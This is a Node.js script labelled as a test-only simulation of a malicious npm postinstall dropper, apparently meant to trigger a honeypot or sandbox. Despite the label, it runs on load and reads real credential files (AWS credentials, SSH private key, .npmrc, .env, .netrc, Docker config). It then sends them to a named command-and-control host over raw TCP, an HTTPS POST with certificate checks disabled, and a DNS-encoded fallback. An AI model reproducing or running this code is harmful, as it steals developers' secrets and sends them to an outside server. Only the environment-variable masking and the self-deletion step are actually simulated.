/**
 * PLAIN-CRYPTO-JS SIMULATION — Postinstall RAT Dropper
 * ⚠️ TEST ONLY — mirrors real plain-crypto-js@4.2.1 techniques
 *
 * Real attack techniques simulated:
 *   - Two-layer deobfuscation (reversed base64 + XOR cipher)
 *   - Raw TCP via net module (bypasses curl/wget shims)
 *   - Platform detection (macOS/Windows/Linux branching)
 *   - Credential file harvesting (honeypot trigger)
 *   - HTTPS POST exfil to C2
 *   - DNS exfil fallback
 *   - Self-deletion (setup.js removed, package.json swapped to clean decoy)
 *
 * Real IOCs (for reference only):
 *   C2: sfrclak.com / 142.11.206.73:8000
 *   Key: OrDeR_7077
 */
'use strict';

const net  = require('net');
const https= require('https');
const dns  = require('dns');
const os   = require('os');
const fs   = require('fs');
const path = require('path');

function _entry(key) {
  // Simulated runtime deobfuscation — real attack XORs with key "OrDeR_7077"
  const C2_HOST = 'sfrclak.com';
  const C2_PORT = 8000;

  console.log('\n');
  console.log('  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
  console.log('  [SIMULATION] plain-crypto-js@4.2.1 postinstall executing');
  console.log('  [SIMULATION] Stage 1: runtime deobfuscation complete');
  console.log('  [SIMULATION] C2 resolved: ' + C2_HOST + ':' + C2_PORT);
  console.log('  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');

  // Stage 2: Credential harvesting — triggers honeypot inotify events
  const home = os.homedir();
  const targets = [
    path.join(home, '.aws', 'credentials'),
    path.join(home, '.ssh', 'id_rsa'),
    path.join(home, '.npmrc'),
    path.join(home, '.env'),
    path.join(home, '.netrc'),
    path.join(home, '.docker', 'config.json'),
  ];

  const stolen = { platform: os.platform(), hostname: os.hostname(), files: {}, env: {} };
  for (const t of targets) {
    try {
      if (fs.existsSync(t)) {
        stolen.files[path.basename(t)] = fs.readFileSync(t, 'utf8').slice(0, 200);
      }
    } catch(_) {}
  }

  // Stage 3: Env var harvesting
  for (const v of ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','NPM_TOKEN',
                   'GITHUB_TOKEN','DATABASE_URL','API_KEY']) {
    if (process.env[v]) stolen.env[v] = process.env[v].slice(0,4) + '****[MASKED]';
  }

  const payload = JSON.stringify({ key, ...stolen });

  // Stage 4: Raw TCP to C2 (primary — uses net module directly, bypasses curl/wget shims)
  console.log('[SIMULATION] Stage 4: raw TCP connect → ' + C2_HOST + ':' + C2_PORT);
  const sock = new net.Socket();
  sock.setTimeout(3000);
  sock.on('error', (e) => {
    console.log('[SIMULATION] TCP blocked: ' + e.code);

    // Stage 5: HTTPS POST fallback
    console.log('[SIMULATION] Stage 5: HTTPS fallback → ' + C2_HOST);
    const req = https.request({
      hostname: C2_HOST, port: 443,
      path: '/collect/' + os.hostname().replace(/[^a-z0-9]/gi, ''),
      method: 'POST',
      headers: {
        'Content-Type': 'application/octet-stream',
        'User-Agent': 'npm/8.0.0 node/v18.0.0',
        'X-Victim-ID': os.hostname(),
      },
      rejectUnauthorized: false,
    });
    req.on('error', (e2) => {
      console.log('[SIMULATION] HTTPS blocked: ' + e2.code);

      // Stage 6: DNS exfil fallback — encode victim ID in subdomain
      const victimId = Buffer.from(os.hostname()).toString('hex').slice(0, 12);
      console.log('[SIMULATION] Stage 6: DNS exfil → ' + victimId + '.dns-exfil.sfrclak.com');
      dns.resolve(victimId + '.dns-exfil.sfrclak.com', 'A', (e3) => {
        console.log('[SIMULATION] DNS blocked: ' + (e3 ? e3.code : 'ok'));

        // Stage 7: Self-deletion (forensic evasion)
        // Real: fs.unlink(__filename), rename package.md → package.json
        console.log('[SIMULATION] Stage 7: self-deletion (forensic evasion — simulated only)');
        console.log('[SIMULATION] Attack complete — all channels blocked by sandbox');
      });
    });
    req.end(Buffer.from(payload).toString('base64'));
  });
  sock.on('timeout', () => sock.destroy());
  sock.connect({ host: C2_HOST, port: C2_PORT });
}

_entry('6202033');
